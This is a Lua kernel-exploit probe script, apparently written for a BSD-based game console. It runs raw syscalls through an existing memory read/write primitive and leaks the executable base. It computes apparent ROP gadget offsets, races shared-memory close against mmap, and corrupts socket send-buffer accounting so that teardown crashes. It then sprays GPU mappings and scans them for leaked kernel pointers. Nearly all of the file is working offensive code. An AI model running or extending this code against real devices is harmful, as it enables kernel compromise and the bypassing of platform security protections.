-- CRASH_CLASS: HIGH
-- PROBE 93c7: pipe2 + shm close/mmap race + sndbuf teardown crash
--
-- Three vectors in one probe:
-- A) pipe2(542) - only untested BSD syscall. pipe(42) returns dead fds.
-- B) shm_open + close/mmap race with child thread
-- C) sndbuf teardown: close socket with corrupted sb_cc > sb_hiwat,
--    then spray GPU pages to catch freed kernel objects

print("=== PROBE 93c7: PIPE2 + SHM RACE + SNDBUF TEARDOWN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function split(val)
    if val == nil then return 0, 0 end
    if type(val) == "number" then
        if val < 0 then val = val + 0x100000000 end
        if val >= 0x100000000 then
            local hi = math.floor(val / 0x100000000)
            return val - hi * 0x100000000, hi
        end
        return val, 0
    end
    if type(val) == "table" and val.h then
        local h, l = val.h, val.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return l, h
    end
    return 0, 0
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Ignore SIGSYS so nosys stubs don't kill us
local sa = memory.alloc(32)
wq(N(sa), uint64(1))
pcall(function() mk(416)(uint64(12), sa, uint64(0)) end)

-- Eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local elo = rd(N(ib) + 0x108) or 0
local ehi = rd(N(ib) + 0x10C) or 0
if elo < 0 then elo = elo + 0x100000000 end
if ehi < 0 then ehi = ehi + 0x100000000 end
print(string.format("eboot=0x%X%08X", ehi, elo))

local function eoff(off)
    local lo = elo + off; local hi = ehi
    if lo >= 0x100000000 then hi = hi + 1; lo = lo - 0x100000000 end
    return lo, hi
end

-- ========== SECTION A: pipe2(542) ==========
print("")
print("--- A: pipe2(542) ---")

local pfd = memory.alloc(8)
wd(N(pfd), 0xDEAD); wd(N(pfd) + 4, 0xDEAD)

-- pipe2(fildes, flags) -- try flags=0 first
local ok_p2, rv_p2 = pcall(function() return mk(542)(pfd, uint64(0)) end)
local p2ret = ok_p2 and N(rv_p2) or -999
local p2fd0 = rd(N(pfd)) or 0xDEAD
local p2fd1 = rd(N(pfd) + 4) or 0xDEAD
print(string.format("pipe2(0): ret=%d fd0=%d fd1=%d", p2ret, p2fd0, p2fd1))

if p2ret == 0 and p2fd0 ~= 0xDEAD then
    -- Test if fds work
    local wbuf = memory.alloc(8)
    wd(N(wbuf), 0x41424344)
    local ok_w, rv_w = pcall(function()
        return mk(4)(uint64(p2fd1), wbuf, uint64(4))
    end)
    local wrote = ok_w and N(rv_w) or -1
    print(string.format("  write(fd1,4)=%d", wrote))

    if wrote == 4 then
        local rbuf = memory.alloc(8)
        wd(N(rbuf), 0)
        local ok_r, rv_r = pcall(function()
            return mk(3)(uint64(p2fd0), rbuf, uint64(4))
        end)
        local readn = ok_r and N(rv_r) or -1
        local readval = rd(N(rbuf)) or 0
        print(string.format("  read(fd0,4)=%d val=0x%08X", readn, readval))
    end

    pcall(function() mk(6)(uint64(p2fd0)) end)
    pcall(function() mk(6)(uint64(p2fd1)) end)
end

-- pipe2 with O_CLOEXEC|O_NONBLOCK = 0x100000|0x4
wd(N(pfd), 0xDEAD); wd(N(pfd) + 4, 0xDEAD)
local ok_p2b, rv_p2b = pcall(function() return mk(542)(pfd, uint64(0x100004)) end)
local p2bret = ok_p2b and N(rv_p2b) or -999
print(string.format("pipe2(O_CLOEXEC|O_NONBLOCK): ret=%d", p2bret))

if not alive() then print("DEAD after pipe2!"); return end

-- ========== SECTION B: shm close/mmap race ==========
print("")
print("--- B: shm close/mmap race ---")

local par_lo, par_hi = eoff(0x992)
local pdr_lo, pdr_hi = eoff(0xC9DFE)
local psr_lo, psr_hi = eoff(0xD77D)
local prdx_lo, prdx_hi = eoff(0x3B02D7)
local bret_lo, bret_hi = eoff(0x42)
local mwr_lo, mwr_hi = eoff(0x92C67)
local stub_lo, stub_hi = split(stub)
local pr8_lo, pr8_hi = eoff(0x991)

-- sys 624 baseline
local vm_ops_before = 0
do
    local ok_v, rv_v = pcall(function() return mk(624)() end)
    if ok_v then vm_ops_before = N(rv_v) end
end

local SHM_RACES = 50
local shm_anomalies = 0

for race = 1, SHM_RACES do
    -- shm_open(SHM_ANON=1, O_RDWR|O_CREAT=0x202, 0777)
    local ok_so, rv_so = pcall(function()
        return mk(482)(uint64(1), uint64(0x202), uint64(0x1FF))
    end)
    if not ok_so then break end
    local shm_fd = N(rv_so)
    if shm_fd < 0 then break end

    -- ftruncate to 16KB
    pcall(function() mk(480)(uint64(shm_fd), uint64(0x4000)) end)

    -- mmap the shm
    local ok_mm, rv_mm = pcall(function()
        return mk(477)(uint64(0), uint64(0x4000), uint64(3),
            uint64(1), uint64(shm_fd), uint64(0))
    end)
    local shm_addr = ok_mm and rv_mm or nil
    local shm_a = shm_addr and N(shm_addr) or 0

    -- Close fd while it's still mapped - the vm_object should stay alive
    pcall(function() mk(6)(uint64(shm_fd)) end)

    -- Write and read to check if mapping is still valid
    if shm_a > 0 then
        local ok_w = pcall(function() memory.write_dword(shm_a, 0xCAFE0000 + race) end)
        if ok_w then
            local v = rd(shm_a)
            if v and v ~= 0xCAFE0000 + race then
                shm_anomalies = shm_anomalies + 1
                print(string.format("  [SHM ANOM] race %d: wrote 0x%08X read 0x%08X",
                    race, 0xCAFE0000 + race, v))
            end
        end
        -- munmap
        pcall(function() mk(73)(shm_addr, uint64(0x4000)) end)
    end

    if not alive() then print("DEAD in shm race " .. race); return end
end

-- sys 624 after
local vm_ops_after = 0
do
    local ok_v, rv_v = pcall(function() return mk(624)() end)
    if ok_v then vm_ops_after = N(rv_v) end
end

print(string.format("shm_races=%d anomalies=%d vm_delta=%d",
    SHM_RACES, shm_anomalies, vm_ops_after - vm_ops_before))

if not alive() then print("DEAD after shm races!"); return end

-- ========== SECTION C: sndbuf teardown + GPU spray ==========
print("")
print("--- C: sndbuf teardown + GPU spray ---")

-- Do the sndbuf race on 10 sockets, close them all, then spray GPU
local SOCK_COUNT = 10
local crashed = false

for si = 1, SOCK_COUNT do
    local sv = memory.alloc(8)
    wd(N(sv), 0); wd(N(sv) + 4, 0)
    local sp = N(mk(135)(uint64(1), uint64(1), uint64(0), sv))
    if sp ~= 0 then break end
    local rfd = rd(N(sv)) or -1
    local wfd = rd(N(sv) + 4) or -1

    -- Set sndbuf to 65536
    local sv2 = memory.alloc(4); wd(N(sv2), 65536)
    pcall(function() mk(105)(uint64(wfd), uint64(0xFFFF), uint64(0x1001), sv2, uint64(4)) end)

    -- Fill buffer
    local fill_buf = memory.alloc(256)
    for i = 0, 252, 4 do wd(N(fill_buf) + i, 0x41414141) end
    local filled = 0
    for chunk = 1, 300 do
        local ok, rv = pcall(function()
            return mk(133)(uint64(wfd), uint64(fill_buf), uint64(256), uint64(0x80))
        end)
        if not ok then break end
        local n = N(rv)
        if n >= 0x80000000 then n = n - 0x100000000 end
        if n <= 0 then break end
        filled = filled + n
    end

    -- Shrink hiwat to 1
    local optval = memory.alloc(4); wd(N(optval), 1)
    pcall(function() mk(105)(uint64(wfd), uint64(0xFFFF), uint64(0x1001), optval, uint64(4)) end)

    -- Close BOTH sides without draining (corrupted sb_cc >> sb_hiwat)
    pcall(function() mk(6)(uint64(wfd)) end)
    pcall(function() mk(6)(uint64(rfd)) end)

    if not alive() then
        print(string.format("  CRASH on socket %d close! filled=%d", si, filled))
        crashed = true
        break
    end
end

if not crashed then
    -- Spray GPU pages and scan for kernel pointers
    local gpu_spray = {}
    local kptr_found = 0
    for gi = 1, 8 do
        local ok_g, rv_g = pcall(function()
            return mk(477)(uint64(0), uint64(64*0x4000), uint64(0x33),
                uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
        end)
        if ok_g then
            local ga = N(rv_g)
            if ga > 0 then
                gpu_spray[#gpu_spray + 1] = {addr = ga, size = 64*0x4000}
                -- Scan for nonzero (kernel data)
                for off = 0, 64*0x4000 - 8, 0x1000 do
                    local lo = rd(ga + off) or 0
                    local hi = rd(ga + off + 4) or 0
                    if lo < 0 then lo = lo + 0x100000000 end
                    if hi < 0 then hi = hi + 0x100000000 end
                    if hi >= 0xFFFF8000 and hi < 0xFFFFFFFF then
                        kptr_found = kptr_found + 1
                        if kptr_found <= 10 then
                            print(string.format("  [GPU KPTR!] chunk %d off=0x%X: 0x%08X%08X",
                                gi, off, hi, lo))
                        end
                    end
                end
            end
        end
    end

    -- Also check sys 624 delta
    local vm_ops_final = 0
    do
        local ok_v, rv_v = pcall(function() return mk(624)() end)
        if ok_v then vm_ops_final = N(rv_v) end
    end

    print(string.format("gpu_chunks=%d kptrs=%d vm_total_delta=%d",
        #gpu_spray, kptr_found, vm_ops_final - vm_ops_before))

    -- Unmap GPU
    for _, g in ipairs(gpu_spray) do
        pcall(function() mk(73)(uint64(g.addr), uint64(g.size)) end)
    end
end

print("")
print("alive=" .. tostring(alive()))
print("=== 93c7 COMPLETE ===")
